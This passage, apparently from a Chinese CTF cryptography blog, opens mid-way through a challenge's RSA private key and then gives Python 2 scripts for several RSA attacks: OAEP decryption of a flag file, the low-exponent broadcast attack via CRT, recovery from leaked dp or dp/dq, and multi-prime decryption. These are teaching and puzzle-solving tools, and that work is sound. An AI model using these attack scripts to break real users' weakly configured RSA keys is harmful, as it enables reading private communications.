class="line">Q5i&#x2F;ZS9nfid1+VZHusTwTmcr2uAadxRAKcGoZ1qP9S6+joIxPUMm1JeGKRUUqWk2</span><br><span class="line">LHbttZDr7G&#x2F;O1cokHKr2Y&#x2F;gGomLLJnTTW4JLttXgSTJ7YvgFxPcOhlmb8xclAqo8</span><br><span class="line">l3iEexb9GvVnzwMXl9DGaYXwjfrO7mgkYwYk4eRM+OmtJcfgwBW7tGdIkAObIH8M</span><br><span class="line">F+udE0Srqwilw9zBmIjFzk9ah5sLv73XDqkJWYH6iE9ZYGuEhK3ZxyWM6MDo9yae</span><br><span class="line">N5V84UgpD1HnvZgv9syA5&#x2F;AyC4lRkk7CbVBTKzt3ctG9Gh+S1xJ5YWHFpH6zhevw</span><br><span class="line">fG1GA8Xm1YEsun7qjVF9Y1U0KrbU3DFa8Znj3IyDC6Iq1TxBSEFUGqnotnC&#x2F;0&#x2F;7t</span><br><span class="line">GRcUlBOzF+OLjm9T7eJE6Eoy1lwNqID1&#x2F;ALpRlXVpNPnxjB3+XPpRFLYE51dv576</span><br><span class="line">OrWWeYJbzRlcBqkAlv1MpHOIGuw8Ed65PeBQAB6sIZehln1rFflsyTR&#x2F;cNedLdFI</span><br><span class="line">SoFx+BLdMrpkMWAIJksJIgODkBd&#x2F;86dyV7+JbeTXQCSLe73fM8D&#x2F;MC7obB0CAwEA</span><br><span class="line">AQKCAgAuZ5DPh6XboqC7eKeBaSTBDaI&#x2F;cGOmAbt+znDu9WkOcNuEGhzA426u2Jm8</span><br><span class="line">iKVzeXLbSgGIyIFxVaIwtPKyyH6z&#x2F;kREaF+3DNoFEOgE2WmdJRgJS4SwQOrFB7IJ</span><br><span class="line">HJr5dAeegftg+M0BVQQrcw6uwQHBvXl4W0YA8m&#x2F;I0hhWGxhxZ6nt0&#x2F;MArbtDB2NB</span><br><span class="line">OgN9UdJ3sd3iYo2+rM1EO9v9bZyutkPvfyFpzFcfiWPPjWHdJdN+G+Szno9VVUmx</span><br><span class="line">KDZWE+moY96a6HH409juattxnLZgU3EUfMGCm&#x2F;GUdugeZNCAGs5S+ym&#x2F;zb6wONig</span><br><span class="line">QlomoldnWHVI66flir8++RALcUFWC46IH2FyrAJfWR+c8E5ns8Z+HlnZFFO+z2i&#x2F;</span><br><span class="line">xWWc9jqFMqDq0yQccqLUWFqPDVINClfIu7bUoM7QLuEKohdkyTwbcx9zOqVuNg7d</span><br><span class="line">18g+Qrm3Ru+uD0ni85mnwWA3kZPdQ6pvJaEDJzRPp0rpZyjEP4p2FtXDbp7I1gy9</span><br><span class="line">qH834mmrcH2R5RANmJZFIb0T49beAqF7B3wO0AfCpUj1D827JRKCww1OLv02FVAL</span><br><span class="line">NPjcf7aIfecFAHTOc56NOwLdB7MvPw4O5LtUaLTHMUxZ1CIzB&#x2F;Ks4P9Yn7O0du9n</span><br><span class="line">FxPmYPWCYoXJX+DFOqc3U4atY6bTs2z6QLs6cdPQrltEXeYFRQKCAQEA7iHlusjD</span><br><span class="line">SIy9vtxsYzr2qz6CqMUrd8FtaeYf2SCGXHEGfDlYCVNbS0dktyAkZ27mZxAovKzR</span><br><span class="line">hRwB04PxtNNboTPdo5iDbqC8J8Kxvz6W6TeCjZLDEyoOunrYdE8SyK&#x2F;1tX7oCrbe</span><br><span class="line">+8Xk3pE5RzypwNZbp7V9gQsjJxe6oZlkRTXEGgJDJ5mV+v29ngoNki+zMhTk6emu</span><br><span class="line">bf23cSmT+f7cw5Cs5+jgaCMrYliciLaejF869+JCcZm2Kj7eCP0lDJ9HMVa+v79n</span><br><span class="line">KPeDyvdj680KMNv3RQhVjfavMsoIriIDfKczduzBdtylgBkLsqozoqmhyL&#x2F;MuAY3</span><br><span class="line">1VwCrLXipyWIzwKCAQEAzwrQ0VVkMYZ7xIxCnv004&#x2F;DyDePSOJkU2ToMaE0Bcf+y</span><br><span class="line">pEEu&#x2F;KjW8aU6TKPNWHnAcCL0nzozoZcYNJyrI195DXiT8wXSaL2uR2gum+E71ov8</span><br><span class="line">5MdIz+z9NTqXJsvRjy5w399n&#x2F;O+g+XeIObAMGi+&#x2F;UdLYLgquPVa7Pd37sPt69Cf1</span><br><span class="line">H7TZx9y6+nXH1iCLa5LQm0pgedaQTxbR9EtY&#x2F;Fj2vIc4I5JxduGb3kFm7D3Sc6Nq</span><br><span class="line">P354hJnmO&#x2F;diiCjxLhVqHiiPuIrmAOSZ4X4VRWOkPMylKoFkx3HxqW1Zkq&#x2F;Hk&#x2F;ms</span><br><span class="line">jM8IUHBtSKd6Vh3&#x2F;&#x2F;NYUq2SCt2Dys95f6YlonhQfUwKCAQEAwypk7cC8zCkNGe&#x2F;t</span><br><span class="line">pSYeJBsHWuq9xVhyI+jHEVzmwbygZA9bZ8k5eWj50lw1edAaZT2JJZk93qollQT+</span><br><span class="line">hAT1hBjN&#x2F;dZxYam6i5u1sdfKNzmXdhBicMJ3b75eyHRGINSVvDpWUvGtrwtxmDfN</span><br><span class="line">ieTd+32zgK&#x2F;uPGS0WsXH38mntFFsdySDhWEK2ro7PdtfZABUDSeytUMgAmV+gvBg</span><br><span class="line">pvOKW32nOCpUQQUR+XhGUoXZS5KA8cguTIx+EAGWWCegxceEwZsmmmB0W87&#x2F;5Mj8</span><br><span class="line">y7UwNPsSnTFHbSJQVH&#x2F;gvVaDJRajx0QjCxerTGE6hSOZTidYwP7w+aGfAO54ArTP</span><br><span class="line">Hc5VYQKCAQBVC3RLCHBnh34&#x2F;df3HoOqg1tAWtIYdiYPu1tFR5o+5a&#x2F;bNUZkjX5cr</span><br><span class="line">G1ufL4mh1iEd7r3cyeN7dL0Un2YM2aK3zde386RCMefsnPbIQPR7ZHU05EccYZSA</span><br><span class="line">0NhVr1MdJU5oJzRnyWauElN6nr3Z49MKoTj7cJexynaPKye&#x2F;wwz2TZN6uqbaWejU</span><br><span class="line">CJ1Vb3jVbzERGLQYV&#x2F;JfClijqG+c+E4hksmUkwrYckO8P9EvKRXROkbiXejTTwQr</span><br><span class="line">jaqDk42+CD3WtYKTozpnE3&#x2F;CCDBkmFFWSBlwJEZpRnylw60Pe&#x2F;TW66&#x2F;dBw27PPMm</span><br><span class="line">7ORri1cjXCyRWm&#x2F;3M3N+PtHW9AJtLIbRAoIBABgyTrVuAjXd7qO57px&#x2F;XHtUXvgX</span><br><span class="line">udo7XstJ9DYLE4roLEj8zUYDFS9KmGjANcmBpcgbKagWN9SqDQSfo8WkEoAue74n</span><br><span class="line">7+8goDbeh0YQ2y0mDmpP34dBwF79USn3O+2lVI+1HXUTfTxOTmLPo5bSsv38HL2t</span><br><span class="line">3Ll6cUCg&#x2F;&#x2F;M7IAQbpRME3z8gIe0&#x2F;HNWkZjyRadnBsk1QbEmZ8fBtiEp2LHFjnJLA</span><br><span class="line">SiU+f38+cqqUFcrGBlNvc&#x2F;7W0SB2a5rp81XRwBGXEGtt+fYlBCWIuHVEih9qFqnP</span><br><span class="line">6VAeL6lKMzIpH1rbIrwFoIpMzyrnAjZGOJZ6bBcbgMFtNLBmJMSlmuSIao8&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP    </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Downloads/godlikeRSA/pubkey.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    key = RSA.importKey(f)  </span><br><span class="line">    N = key.n  </span><br><span class="line">    e = key.e    </span><br><span class="line">    <span class="keyword">print</span> N  </span><br><span class="line">    <span class="keyword">print</span> e    </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Downloads/godlikeRSA/1.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    private = RSA.importKey(f)  </span><br><span class="line">    oaep = PKCS1_OAEP.new(private)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Downloads/godlikeRSA/flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">print</span> oaep.decrypt(f.read())</span><br></pre></td></tr></table></figure><h4 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h4><p>前提：</p><p>模数n、密文c不同，明文m、加密指数e相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, iroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">broadcast</span>(<span class="params">n1, n2 ,n3, c1, c2, c3</span>):</span></span><br><span class="line">    n = [n1, n2, n3]</span><br><span class="line">    C = [c1, c2, c3]</span><br><span class="line">    N = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">        N *= i</span><br><span class="line"></span><br><span class="line">    Ni = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">        Ni.append(N / i)</span><br><span class="line"></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        T.append(long(invert(Ni[i], n[i])))</span><br><span class="line"></span><br><span class="line">    X = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        X += C[i] * Ni[i] * T[i]</span><br><span class="line"></span><br><span class="line">    m3 = X % N</span><br><span class="line">    m = iroot(m3, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> m[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    c1 = <span class="number">0x9e84763bdbe246fad0a9cd52fda6233e6128a6210efaf3e6dea4fe272f78ad1f8f5cc7022f62f4f542341128e42d6fd10e67c5f96edbd243917c0151289f7228e44019b8c65a541d7306b398465e26b69cab36cc61e4ac094832b4299bbaf4630b722a0fb4f1997053be97e926f94afb55a0bb6ef00ab694e2f595d9eb8ca96c49f5cbbe194529f68a1aaf6f5151484b471285ba8fc8cd30b55612f35a74dc68e255c363579a80d27ce5090873ac719ba59f2492c91fd28bcce26b6a02bae005cbbd2a4cfe5b93442be8664d2313d412e7e09f545c64b7b74bbc408b6e574d0d300135cba8d6c1d73737d59baca9992ede644d856eb4cfcda562a75743e4b491</span></span><br><span class="line">    c2 = <span class="number">0x9817fdc7b31a8f9cde1794096d3aa2bc6fe06fe34d4b7c9ca9a77982adf67fd4a7e636659553f4168a16757dc3a75e54ff850b9a94a5270f4f75502c7055a3a389df2ea6b00784a4e78e66901b427253c0f343f127e0ff162a349bb14eb4c1453fc6daace19bba4940d77c435686ef3b59f732072cde2e148d1a64f9682b3f1ceb9a000d87e180a1f9eb20c59dbebc13ddb2e07b64db89217f40369aeec878a45d99909ab2a3e4cdb74aa68890c941315ae289d6667200c53f9a32c8a64bfc74e62898ac03c460f945a13f11ee28860a3cd07526c30aa92eb89442a76549fe4ed8a43d14fdeeb350e90443a3a586db719f8610eb5d4a8f5bd1e481b5ef6e96ef</span></span><br><span class="line">    c3 = <span class="number">0xb0c5ee1ac47c671c918726287e70239147a0357a9638851244785d552f307ed6a049398d3e6f8ed373b3696cfbd0bce1ba88d152f48d4cea82cd5dafd50b9843e3fa2155ec7dd4c996edde630987806202e45821ad6622935393cd996968fc5e251aa3539ed593fe893b15d21ecbe6893eba7fe77b9be935ca0aeaf2ec53df7c7086349eb12792aefb7d34c31c18f3cd7fb68e8a432652ef76096096e1a5d7ace90a282facf2d2760e6b5d98f0c70b23a6db654d10085be9dcc670625646a153b52c6c710efe8eb876289870bdd69cb7b45813e4fcfce815d191838926e9d60dd58be73565cff0e10f4e80122e077a5ee720caedc1617bf6a0bb072bbd2dab0</span></span><br><span class="line">    n1 = <span class="number">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555</span></span><br><span class="line">    n2 = <span class="number">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867</span></span><br><span class="line">    n3 = <span class="number">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303</span></span><br><span class="line">    m = broadcast(n1, n2 ,n3, c1, c2, c3)</span><br><span class="line">    <span class="keyword">print</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">items</span>):</span></span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N / n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>: <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = [<span class="number">8564529398597496052509875513481234511905571293608253591774352345237876733293108831203723008958367224489489969614656703455962549261315442327443089652074571708651505447379309166100331065440172781968875497386410667715026180057913363208450111095566219238303387888025161407043477291378931412269049849744457547932264137377411127192940332805452317547219248055802197050456726624516860024108642571703812719370387292166670300197241575461417648592309869669813374010765766544607691011957968652581504886331252936146901456910589102484807039294566703917033093028140452849747910537865958098720693569821256189593894121111357731919189L</span>,<span class="number">12222166297277342805260668042066733749258843622057497574551492680820573970618063356710810891221670366396148862070530068431772630271300064517141331380959413811482890080103511756363920299387620181525172247384085449944650678616398890947062703879307721506228672839270493453501648644787019360131991056158375296484870723717496184332078521221915234959627683952251865227849249752415242124235776428944052873501045127442031423538183282845800971359590735184850648986263721823804859410866927117413289461014754456802566932965710529063515405296476007642849800772934170961993925017146017197762805148533435040675962332469643915192423L</span>,<span class="number">5057224034499776793532654516178914954537547410664409403680432108569079856741764362023185604595829263918927121465578691201904227912897025244771553860102714429349163283510695391193774853323951653123109509215361937850724934183826508070404239791710229214063382081391564954935544392514769166830815475459218792639383796711824752291158895292103354274632470559179266550681095452239666165213986993496109747058314685303485222302144835490056402939133225003233112131275635419321982899965440912525225759368684717157077161771778903529280898069381899400305195745292409238361901176051346615633641550303346790420492393767770845418243L</span>]</span><br><span class="line">c = [<span class="number">20010971557789931948130798983030201950038450269144104532821030667924400788869920238579729514672630221804096063149106742412869966814701225466606392171030411339119559280790040322081104363393453503417465768386174002015870794567148694722215873094298859132439253412531445187990845476275251348800166731481176155530755581153710085966976765505591809596417849783597055650440598035159288091495453205698044687869932756053447012994409598155552263807571713982758132066319612777306466708222135510918174055647735727504029507503430288609410745159037684948343055275573269067165460711584845480188706531450367147105629493736100726092945L</span>,<span class="number">19200052919818196558567528701224082155105852846109782021681848107226495293687021416871117444987923837810238872836818190457667509409714021669160815809413653880491792640346474248859559867743715715552372738909255050196638006472279364316678941257894898953088366861786500472095752890593521428325838148184891778283229870316694059734109045397448347320487605412988229047015174998893589731503114337273121463601984792339337970193596813660178636222764332155999993506914518600565394196792457144962180040786607335687020278442899146954126853580244264273526509238060494624980807993322975135366653181977147866567146492356137019414255L</span>,<span class="number">1394721540127922627584993749596603212491913755865039994631041458882716953251760080638497574652888386411767951258467542002582418260315909190241131591474627765734174146981015346732559115044918706641616288474447294129332475081232268241201488455865700933615291016346552048997127415783072860387265063527874160016186183078384940312292521628077750464413013768765371508493304331719166196330883242895556903378707199640686499970367957552543041110199009425369612644492288765891769004579050802446992426813215932250347386859783813875543314196764160792696291742850356532493945652482643696238487389412404616537620013009141601852080L</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = zip(c, n)</span><br><span class="line">x, n = CRT(data)</span><br><span class="line">m = gmpy2.iroot(gmpy2.mpz(x), e)[<span class="number">0</span>].digits()</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><h4 id="已知dp-dq求解m"><a href="#已知dp-dq求解m" class="headerlink" title="已知dp,dq求解m"></a>已知dp,dq求解m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">  </span><br><span class="line">c = xxx  </span><br><span class="line">p = xxx  </span><br><span class="line">q = xxx  </span><br><span class="line">dp = xxx  </span><br><span class="line">dq = xxx   </span><br><span class="line">  </span><br><span class="line">InvQ=gmpy2.invert(q,p)  </span><br><span class="line">mp=pow(c,dp,p)  </span><br><span class="line">mq=pow(c,dq,q)  </span><br><span class="line">m=(((mp-mq)*InvQ)%p)*q+mq  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)  </span><br></pre></td></tr></table></figure><h4 id="CopperSmith定理攻击"><a href="#CopperSmith定理攻击" class="headerlink" title="CopperSmith定理攻击"></a>CopperSmith定理攻击</h4><p>前提：</p><p>若e较小，并且已知m的高位，则可通过此方法求出完整的m。</p><p>m=0x65c46754a7776c8b88867e000000000000000000 前面的部分就是高位，后面的0就是低位，0只是占位的作用并不是真正m的值。</p><h4 id="已知e-n-dp-c求m"><a href="#已知e-n-dp-c求m" class="headerlink" title="已知e,n,dp,c求m"></a>已知e,n,dp,c求m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">n = <span class="number">9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901</span></span><br><span class="line">c = <span class="number">5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827</span></span><br><span class="line">dp = <span class="number">81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">            p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">            q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi)%phi</span><br><span class="line">            m = pow(c,d,n)</span><br><span class="line">            <span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h4 id="N分解出多个不同的因子"><a href="#N分解出多个不同的因子" class="headerlink" title="N分解出多个不同的因子"></a>N分解出多个不同的因子</h4><p>前提：</p><p>题目给出的模数N可直接分解，但是分解之后得到了多个不同的因子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n= <span class="number">544187306850902797629107353619267427694837163600853983242783</span></span><br><span class="line">e= <span class="number">39293</span></span><br><span class="line">c= <span class="number">439254895818320413408827022398053685867343267971712332011972</span></span><br><span class="line">p1 = <span class="number">67724172605733871</span></span><br><span class="line">p2 = <span class="number">11571390939636959887</span></span><br><span class="line">p3 = <span class="number">694415063702720454699679</span></span><br><span class="line">phi = (p1<span class="number">-1</span>)*(p2<span class="number">-1</span>)*(p3<span class="number">-1</span>)  </span><br><span class="line">d = gmpy2.invert(e, phi)  </span><br><span class="line">m = pow(c, d, n)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-密码 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
